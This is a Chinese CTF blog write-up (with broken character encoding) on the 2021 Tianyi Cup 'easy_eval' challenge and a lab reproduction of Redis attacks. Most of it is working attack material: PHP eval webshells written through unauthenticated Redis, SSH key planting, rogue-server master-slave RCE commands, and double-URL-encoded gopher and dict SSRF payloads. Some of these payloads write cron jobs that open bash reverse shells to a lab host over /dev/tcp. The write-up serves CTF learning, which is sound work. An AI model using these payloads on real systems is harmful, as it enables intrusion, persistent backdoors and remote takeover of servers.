---
title: 2021ç¬¬äºŒå±Šâ€œå¤©ç¿¼æ¯â€ç½‘ç»œå®‰å…¨æ”»é˜²å¤§èµ›
tags:
  - null
categories:
  - Redisæ¼æ´å¤ç°
  - çŸ¥è¯†ç‚¹
description: "Welcome to my blog \U0001F601\U0001F601\U0001F601\U0001F601"
top_img: /2.jpg
cover: /image/buu.png
password: sm1le
date: 2021-09-23 09:09:47
top:
---



# 2021ç¬¬äºŒå±Šâ€œå¤©ç¿¼æ¯â€ç½‘ç»œå®‰å…¨æ”»é˜²å¤§èµ›





# esay_eval



```
open_basedir	/tmp/:/var/www/html/	/tmp/:/var/www/html/

pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,passthru,pcntl_alarm,pcntl_waitpid,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv,mail,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,curl_init,curl_exec

session.save_path	/var/lib/php/sessions	/var/lib/php/sessions
```



```
file_put_content("/var/www/html/1.php","<?=eval($_POST[1]);")
```



```php
for($i=0;$i<65535;$i++) {
  $t=stream_socket_server("tcp://0.0.0.0:".$i,$ee,$ee2);
  if($ee2 === "Address already in use") {
    var_dump($i);
  }
}

6379 Opend

$arr = range('20000', '65535');
foreach ($arr as $port) {
//    echo 1;
    $fp = @fsockopen('127.0.0.1',$port,$errno,$errstr,0.1);
    if (!$fp) {
        echo $port." closed\n";
    }else{
        echo $port." Opend\n";
    }
}
```



```
you_cannot_guess_it
```



ä¸ªäººæ„Ÿè§‰å°±æ˜¯`ssrf`å¤§ `redis`æˆæƒåå¼¹`shell`äº†ï¼

```
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}
$url = $_GET['url'];
curl($url);
```



ä¸ä¼šçš„è¯ï¼Œé‚£å¼Ÿå¼Ÿæˆ‘åªèƒ½å­¦ä¹ ä¸‹ä¸»ä»å¤åˆ¶äº†ï¼ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“

![image-20210923122307616](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923122307.png)

## Redisæ¼æ´å¤ç°

å®éªŒç¯å¢ƒï¼ å°±æ­£å¸¸å¼€äº†ä¸¤ä¸ª`redis`å®ä¾‹ï¼ å®‰å…¨æ¨¡å¼æ²¡è§‚ï¼

Redisæœªæˆæƒè®¿é—® å°±æ˜¯æ²¡å¼€`protected-mode` å¼€äº†å å°±ç®—è¿œç¨‹è¿æ¥ä¸Šä¹Ÿä¼šæŠ¥é”™çš„ï¼

### 1ã€Redisæœªæˆæƒè®¿é—®å†™webshell

**åˆ©ç”¨æ¡ä»¶ï¼š**

> 1. å­˜åœ¨Redisæœªæˆæƒè®¿é—®
> 2. ç™»é™†çš„ç”¨æˆ·å…·æœ‰è¯»å†™æƒé™
> 3. çŸ¥é“ç½‘ç«™çš„è·¯å¾„

![image-20210923122755194](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923122755.png)

```
redis-cli -h 192.168.59.129
set shell "\n\n<?php @eval($_POST['xigua']);?>\n\n"
config set dir /var/www/html/
config set dbfilename shell.php
save
```

åœ¨ä»æœºä¸Šæ˜¯ä¸èƒ½æ“ä½œçš„ï¼ åªèƒ½è¯»å–ï¼ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“

![image-20210923122907374](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923122907.png)



ç»è¿‡æˆ‘çš„æµ‹è¯•ï¼å‘ç°ç®¡ç†ã€127.0.0.1 å¯ä»¥è¿œç¨‹è®¿é—®åˆ°ï¼ä½†æ˜¯ä¼šæœ‰è®©æˆ‘ä»¬å»è®¾å¯†ç ï¼

![image-20210923152627380](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923152627.png)

è®¾ç½®å®Œå¯†ç åæ‰èƒ½è¿æ¥ï¼ æµ‹è¯•çš„æ—¶å€™å¯ä»¥ç›´æ¥å…³äº†`protected-mode no`

ç»•è¿‡å¯ä»¥è¿œç¨‹è®¿é—® æ²¡å¼€ä¿æŠ¤ï¼å°±å¯ä»¥æœªæˆæƒè®¿é—®äº†ï¼ğŸ±â€ğŸ‘“

![image-20210923153336325](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923153336.png)



### 2ã€Rediså†™å…¥å¯†é’¥sshç™»é™†

è¿™ä¸ªæ²¡å¤ç°ï¼ 

#### **0x01 ç®€ä»‹**

æ”»å‡»æœºä¸Šç”Ÿæˆrsaå…¬é’¥å’Œç§é’¥ï¼Œå°†å…¬é’¥ä¼ è‡³é¶æœºä¸Šï¼Œé€šè¿‡sshç™»é™†

å‰ææ¡ä»¶ï¼š

> 1. å·²çŸ¥ç™»é™†ç”¨æˆ·å
> 2. ç™»é™†çš„ç”¨æˆ·å…·æœ‰è¯»å†™æƒé™
> 3. ç›®æ ‡æœåŠ¡å™¨å¼€å¯sshæœåŠ¡

#### **0x02 å¤ç°è¿‡ç¨‹**

**1ï¼‰å¼€å¯sshæœåŠ¡**

åœ¨redis3.2.0çš„æœºå­ä¸Šå¼€å¯sshæœåŠ¡

```
/etc/init.d/ssh start
```

![RiW2vV.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144618.jpeg)

**2ï¼‰ç”Ÿæˆssh-rsaå¯†é’¥**

åœ¨Redis4.0.8çš„æœºå­ä¸Šåˆ›å»ºssh-rsaå¯†é’¥ï¼Œé€šè¿‡è¿œç¨‹è¿æ¥å°†å¯†é’¥è½½å…¥Redis3.2.0çš„æœºå­å†…

```
ssh-keygen -t rsa

-t æŒ‡å®šå¯†é’¥ç±»å‹
id_rsa ç§é’¥
id_rsa.pub å…¬é’¥
```

![RiWfDU.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144620.jpeg)

**3ï¼‰ç¨åŠ å¤„ç†**

è¿™é‡Œå°†å¯†é’¥å¼€å¤´å’Œç»“å°¾æ·»åŠ äº†ä¸€äº›`\n`ç”¨äºé˜²æ­¢ä¹±ç ï¼Œå¹¶å†™åˆ°key.txtä¸­

```
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

-e æ¿€æ´»è½¬ä¹‰å­—ç¬¦
æ·»åŠ \n\nçš„ç›®çš„æ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå°†å†…å®¹å’Œä¸€äº›å…¶ä»–ä¸œè¥¿åˆ†éš”å¼€æ¥ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ­£ç¡®è§£æ
```

![RiWhbF.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144623.jpeg)

**4ï¼‰å°†å…¬é’¥å†™å…¥redisæœåŠ¡å™¨å†…å­˜**

```
cat key.txt | redis-cli -h 192.168.112.132 -a 123.com -x set pubkey

-x ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä½œä¸ºè¯¥å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ï¼Œå°†key.txtå†…å®¹ä½œä¸ºå˜é‡pubkeyçš„å€¼
```

![RiWWuT.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144625.jpeg)

**5ï¼‰è®¾ç½®è·¯å¾„å’Œä¿å­˜çš„æ–‡ä»¶åï¼Œå°†å†…å­˜å˜é‡å¯¼å…¥è‡³ç£ç›˜æ–‡ä»¶**

ä¿å­˜è‡³/root/.sshç›®å½•ä¸‹çš„authorized_keysä¸­ï¼ˆè·¯å¾„ä¸å­˜åœ¨éœ€è¦æå‰åˆ›å»ºï¼‰

```
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

![RiW5E4.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144632.jpeg)

**6ï¼‰ç™»é™†ssh**

è¿œç¨‹sshç™»é™†è¿›192.168.112.132çš„ä¸»æœº

```
ssh -i id_rsa root@192.168.112.132
```

![RiWIUJ.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923144636.jpeg)



### 3ã€è¿œç¨‹ä¸»ä»å¤åˆ¶RCE

#### **0x01 ç®€ä»‹**

Redis Rogue Server RCEæŠ€æœ¯ï¼šé€šè¿‡è¿œç¨‹æ§åˆ¶Redisä¸»æœºä½¿ç”¨FULLRESYNCåŒæ­¥æ–‡ä»¶è‡³ä»æœºä¸Šï¼Œåœ¨ä»æœºä¸ŠåŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œè¿›è€Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚`Redis Rogue Server`çš„æ¶‰åŠä¸»è¦æŠ€æœ¯ä¸ºRedisçš„**ä¸»ä»å¤åˆ¶**ä»¥åŠ**å¤–éƒ¨æ¨¡å—åŠ è½½**ï¼Œæ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š

**ç®€å•ç‚¹ç†è§£å°±æ˜¯ æˆ‘ä»¬ä¼ªé€ ä¸»æœºï¼ è®©é¶æœºæ˜¯ä»æœºï¼ ä»å®¹RCEï¼**

åˆ©ç”¨åŸç†ä»‹ç»ï¼šhttps://xz.aliyun.com/t/5665#toc-15



å¤ç°ä¸€ä¸‹ï¼š

Awsome-Redis-Rogue-Serverå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/Testzero-wz/Awsome-Redis-Rogue-Serverredis-rogue-server `Redis 4.x <= 5.x`

å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/n0b0dyCN/redis-rogue-server



```
è¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªå·¥å…·

1ï¼‰å¯åŠ¨è„šæœ¬æ‰§è¡ŒRedis Rogue Server RCE
192.168.59.129 ubuntu é¶æœº  192.168.59.128 kali

python3 redis_rogue_server.py -rhost 192.168.59.128 -lhost 192.168.59.129

python3 redis_rogue_server.py -rhost 192.168.59.128 -lhost 192.168.59.129 -rport 6380

python3 redis_rogue_server.py -h    # æŸ¥çœ‹è„šæœ¬çš„ä½¿ç”¨æŒ‡å—
-rhost è¿œç¨‹ä¸»æœºï¼Œä»æœº
-lhost æœ¬åœ°ä¸»æœºï¼Œä¸»æœº(Rouge Server)
```

å¯å¥‡æ€ªäº†ï¼ åˆšå¼€å§‹æ˜¯æ²¡æˆåŠŸçš„ï¼ æˆ‘ä»¥ä¸ºæ˜¯redisç‰ˆæœ¬ä¸åŒ¹é…ï¼ ç„¶åè¯•äº†è¯•ï¼åˆæˆåŠŸäº†ï¼ ä½†æ˜¯ é¶æœºçš„redisè¦æ±‚ç‰ˆæœ¬åœ¨4åˆ°5ä¹‹é—´ï¼æˆ‘kaliç”¨çš„æ˜¯ 3ï¼

![image-20210923160607284](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923160607.png)



![image-20210923160804196](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923160804.png)



**æˆ‘tmçŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šredisæœªæˆæƒäº†ï¼ å› ä¸ºredisæœåŠ¡ä¸€é‡å¯å°±æ²¡å¯†ç äº†ï¼**



### 4ã€æœ¬åœ°ä¸»ä»å¤åˆ¶RCE

#### **0x01 ç®€ä»‹**

å¯¹äºåªå…è®¸æœ¬åœ°è¿æ¥çš„RedisæœåŠ¡å™¨ï¼Œå¯ä»¥é€šè¿‡å¼€å¯ä¸»ä»æ¨¡å¼ä»è¿œç¨‹ä¸»æœºä¸ŠåŒæ­¥æ¶æ„.soæ–‡ä»¶è‡³æœ¬åœ°ï¼Œæ¥ç€è½½å…¥æ¶æ„.soæ–‡ä»¶æ¨¡å—ï¼Œåå¼¹shellè‡³è¿œç¨‹ä¸»æœº

#### **0x02 å¤ç°**

1ï¼‰å·¥å…·å¼€å¯Rogue Server

```
python3 redis_rogue_server.py -v -path exp.so

-v      #å†—ä½™æ¨¡å¼ï¼Œä»…å¯åŠ¨Rouge Serveræ¨¡å¼
-path   #æŒ‡å®š.soæ–‡ä»¶
```



![image-20210923171524520](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923171524.png)

![image-20210923171553071](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923171553.png)

åœ¨æœ¬åœ°ç”¨ä¸»ä»æ¨¡å¼ RCEï¼

6ï¼‰å…³é—­ä¸»ä»æ¨¡å¼

```
slaveof NO ONE
```



## äº”ã€Redisè”åŠ¨SSRFæ¼æ´



### 1ã€RESPåè®®

RESPåè®®æ˜¯RedisæœåŠ¡å™¨é€šä¿¡çš„æ ‡å‡†æ–¹å¼ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„é€šä¿¡å»ºç«‹åœ¨RESPåè®®ä¹‹ä¸Šï¼ŒRESPåè®®å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ”¯æŒç®€å•å­—ç¬¦ä¸²ï¼Œé”™è¯¯ï¼Œæ•´æ•°ï¼Œæ‰¹é‡å­—ç¬¦ä¸²å’Œæ•°ç»„äº”ç§æ•°æ®ç±»å‹çš„åºåˆ—åŒ–åè®®ã€‚

RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚ - å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹ï¼š

1. å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸º`Bulk Strings`çš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚
2. æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚

åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š

å¯¹äº`Simple Strings`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`+`

å¯¹äº`error`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`-`

å¯¹äº`Integer`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`:`

å¯¹äº`Bulk Strings`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`$`

å¯¹äº`array`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`*`

æ­¤å¤–ï¼Œ`RESP`èƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„`Bulk Strings`æˆ–`Array`çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º`Null`å€¼ã€‚ åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥`"\r\n"(CRLF)`ç»“æŸã€‚

```
*3 ä»£è¡¨RESPæ•°ç»„é•¿åº¦ä¸º3
$4 ä»£è¡¨å­—ç¬¦é•¿åº¦ä¸º4
%0d%0a (\r\n) ä»£è¡¨æ¢è¡Œç¬¦ã€ç»“æŸç¬¦
+OK ä»£è¡¨æœåŠ¡ç«¯æ‰§è¡ŒæˆåŠŸåè¿”å›çš„å­—ç¬¦ä¸²
```

`ssrf` è¦äºŒæ¬¡ç¼–ç ä¸€ä¸‹ï¼

![image-20210923185303140](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923185303.png)



![image-20210923185447201](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923185447.png)

```http
GET /ssrf.php?url=gopher://192.168.59.129:6380/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252425%250D%250A%250A%250A%253C%253F%253Deval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A HTTP/1.1
Host: 192.168.59.128
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```



### 3ã€SSRF Redis å†™å…¥shell



![image-20210924095200826](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924095200.png)

å› ä¸º æŠŠæ•°æ®åŒ…æŠ“å–ä¸‹æ¥ï¼ 

#### æ–¹æ³•1

##### å†™shell

```
gopher://192.168.59.129:6380/_
auth welcometowangdingbeissrfme6379
flushall
config set dir /var/www/html
config set dbfilename shell1111.php
set x "<?php eval($_GET[1]);?>"
save
quit
```

è¯•ä¸€è¯•çœ‹çœ‹èƒ½ä¸èƒ½ç©ï¼



é¦–å…ˆ`url`å…¨ç¼–ç ä¸‹ï¼š

![image-20210923210936605](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923210936.png)

ç»•è¿‡ æ›¿æ¢ä¸‹%0A ä¸º%0D%0A

![image-20210923210902232](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923210902.png)



äºŒæ¬¡ç¼–ç ï¼š

![image-20210923210959671](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923210959.png)

æµ‹è¯•ï¼š

```
auth%2520welcometowangdingbeissrfme6379%250D%250Aflushall%250D%250Aconfig%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250Aconfig%2520set%2520dbfilename%2520shell1111%252Ephp%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520eval%2528%2524%255FGET%255B1%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250Aquit%250D%250A
```

åŠ ä¸Šå¤´ï¼š

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aflushall%250D%250Aconfig%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%250D%250Aconfig%2520set%2520dbfilename%2520shell1111%252Ephp%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520eval%2528%2524%255FGET%255B1%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250Aquit%250D%250A
```

![image-20210923211057151](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923211057.png)

æˆåŠŸï¼

![image-20210923211436650](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923211436.png)

```
192.168.59.129/shell1111.php
```

![image-20210923211530197](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923211530.png)



##### åå¼¹shell!

```
auth welcometowangdingbeissrfme6379
flushall
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * /bin/bash -i >& /dev/tcp/192.168.59.128/2333 0>&1\n"
save
quit
```

**æ³¨æ„ & å˜æˆ%26**

æˆ–è€…ç›´æ¥ç”¨bp å…¨éƒ¨éƒ½urlç¼–ç ï¼š

![image-20210924100725971](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924100726.png)

**æ›¿æ¢%0a %0d%0a**  ç„¶åäºŒæ¬¡ç¼–ç ï¼

```
gopher://192.168.59.129:6380/_%2561%2575%2574%2568%2520%2577%2565%256c%2563%256f%256d%2565%2574%256f%2577%2561%256e%2567%2564%2569%256e%2567%2562%2565%2569%2573%2573%2572%2566%256d%2565%2536%2533%2537%2539%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%2563%256f%256e%2566%2569%2567%2520%2573%2565%2574%2520%2564%2569%2572%2520%252f%2576%2561%2572%252f%2573%2570%256f%256f%256c%252f%2563%2572%256f%256e%252f%250d%250a%2563%256f%256e%2566%2569%2567%2520%2573%2565%2574%2520%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%2520%2572%256f%256f%2574%250d%250a%2573%2565%2574%2520%2578%2520%2522%255c%256e%252a%2520%252a%2520%252a%2520%252a%2520%252a%2520%252f%2562%2569%256e%252f%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2535%2539%252e%2531%2532%2538%252f%2532%2533%2533%2533%2520%2530%253e%2526%2531%255c%256e%2522%250d%250a%2573%2561%2576%2565%250d%250a%2571%2575%2569%2574%250d%250a
```



![image-20210924100824344](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924100824.png)

å…¶å®å†™å…¥æˆåŠŸäº†ï¼

![image-20210924101018093](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924101018.png)



å†™æ˜¯å†™å…¥æˆåŠŸäº†ï¼ä½†æ˜¯æ²¡å¼¹æˆåŠŸï¼

`https://blog.51cto.com/u_552627/1909067`

```
1 ã€/etc/crontab åªæœ‰rootç”¨æˆ·å¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨æ—¶éœ€rootæƒé™ï¼Œè€Œä¸”å¿…é¡»æŒ‡å®šè¿è¡Œç”¨æˆ·ï¼Œæ‰ä¼šæ‰§è¡Œ

       */1  *  *  *  *  *  root /usr/sbin/ntpdate s1a.time.edu.cn &> /dev/null    

2 ã€/var/spool/cron/$USER æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨crontab -u username -eå‘½ä»¤æ¥ç›´æ¥ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ã€‚

        */1  *  *  *  *  *  /usr/sbin/ntpdate s1a.time.edu.cn &> /dev/null  

3ã€*     *    *     *    *

    åˆ†   æ—¶   å¤©   æœˆ  å‘¨

4ã€ç‰¹æ®Šç¬¦å·

    /   æ¯

    -   è¿ç»­çš„æ—¶é—´

    ï¼Œ ç¦»æ•£æ—¶é—´

    *   æ‰€æœ‰éƒ½åŒ¹é…
```

`linux`å®šæ—¶ä»»åŠ¡ï¼

`https://segmentfault.com/a/1190000023186565`

![image-20210924110426488](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924110426.png)



åæ¥ç»å¸¸æµ‹è¯•å‘ç°ï¼ å®šæ—¶ä»»åŠ¡æœ‰é—®é¢˜ï¼

æ¢ä¸€ä¸ªä¹Ÿä¸è¡Œï¼

```
*/1 * * * * bash -c "sh -i >& /dev/tcp/192.168.59.128/1234 0>&1"
```

```
auth welcometowangdingbeissrfme6379
flushall
config set dir /var/spool/cron/crontabs/
config set dbfilename root
set x "\n*/1 * * * * bash -c \"sh -i >& /dev/tcp/192.168.59.128/1234 0>&1\"\n"
save
quit
```

å†æˆ‘æµ‹è¯•è¿‡ç¨‹ä¸­è¿˜å‘ç°ï¼`config set dir /var/spool/cron/`

`dir`åº”è¯¥ä¸ºï¼š `/var/spool/cron/crontabs/`

ä¸ç„¶ `crontab -l` æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰çš„ï¼ ä½†æ˜¯æˆ‘çœ‹å¤§ä½¬ä»¬çš„éƒ½æ˜¯è¿™ä¸ªè€Œä¸”ç½‘ä¸Šçš„**/var/spool/cron/$USER**  ä¹Ÿæ˜¯è¿™ä¸ªï¼   ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“  è¿™é‡Œä¸ä¸Šå¾ˆæ¸…æ¥šï¼

ç»è¿‡æˆ‘é•¿æ—¶é—´çš„æµ‹è¯•ï¼ å‘ç°å¯èƒ½æ˜¯rediså†™ dbfilenameå†™å‡ºäºŒè¿›åˆ¶æ ¼å¼çš„æ–‡ä»¶å†…å®¹æ²¡æ³•æ‰§è¡Œï¼

![image-20210924114940514](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924114940.png)

å¥½åƒæ²¡å‘æ‰§è¡Œï¼ 



```
# æ¸…ç©º key
dict://172.72.23.27:6379/flushall

# è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½•
dict://172.72.23.27:6379/config set dir /var/spool/cron/crontabs/

# åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶
dict://172.72.23.27:6379/config set dbfilename root

# å†™å…¥ Bash åå¼¹ shell çš„ payload
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/192.168.59.128/2333 0>%261\n"

# ä¿å­˜ä¸Šè¿°æ“ä½œ
dict://172.72.23.27:6379/save
```

å†åå¼¹shellä¸Šé¢ å› ä¸ºæ˜¯å†™å…¥å®šæ—¶ä»»åŠ¡ï¼ è¿™é‡Œå°±å‡ºç°ä¸€ä¸ªé—®é¢˜ï¼ è¿™ä¸ªå®šæ—¶ä»»åŠ¡æ–‡ä»¶å†…å®¹æ— æ³•æ‰§è¡Œï¼



ä¸çŸ¥é“æ€ä¹ˆåŠäº†ï¼åƒé¥­åƒé¥­ï¼ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“



#### æ–¹æ³•2

```
*2\r
$4\r
auth\r
$30\r
welcometowangdingbeissrfme6379\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$27\r
upload_like_scy_forever.php\r
*3\r
$3\r
set\r
$1\r
x\r
$24\r
<?php eval($_POST[1]);?>\r
*1\r
$4\r
save\r


```

å»æ‰`\R`

![image-20210924100014644](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924100014.png)

urlç¼–ç ï¼š

![image-20210924095419026](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924095419.png)

ç„¶åæ›¿æ¢

**æ³¨æ„ç‚¹ï¼š**å›è½¦ç”¨%0d%0aè¡¨ç¤ºï¼Œé—®å·éœ€è½¬ä¸ºurlç¼–ç %3fï¼Œæœ€åå¯ä»¥å¤šåŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦

```
gopher://192.168.59.129:6380/_*2%250d%250a$4%250d%250aauth%250d%250a$30%250d%250awelcometowangdingbeissrfme6379%250d%250a*1%250d%250a$8%250d%250aflushall%250d%250a*4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$3%250d%250adir%250d%250a$13%250d%250a/var/www/html%250d%250a*4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$10%250d%250adbfilename%250d%250a$27%250d%250aupload_like_scy_forever.php%250d%250a*3%250d%250a$3%250d%250aset%250d%250a$1%250d%250ax%250d%250a$24%250d%250a%253C%253fphp%2520eval($_POST%255B1%255D);%253f%253E%250d%250a*1%250d%250a$4%250d%250asave
```



```
gopher://192.168.59.129:6380/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%33%30%0d%0a%77%65%6c%63%6f%6d%65%74%6f%77%61%6e%67%64%69%6e%67%62%65%69%73%73%72%66%6d%65%36%33%37%39%0d%0a%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%32%37%0d%0a%75%70%6c%6f%61%64%5f%6c%69%6b%65%5f%73%63%79%5f%66%6f%72%65%76%65%72%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%0d%0a%78%0d%0a%24%32%34%0d%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65
```

![image-20210924100143510](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924100143.png)

å†™å…¥æˆåŠŸï¼ğŸ˜¶ğŸ˜¶

![image-20210924100212165](https://gitee.com/taochiyu/blogimage/raw/master/img/20210924100212.png)





### 4ã€SSRF Redis ä¸»ä»å¤åˆ¶RCE

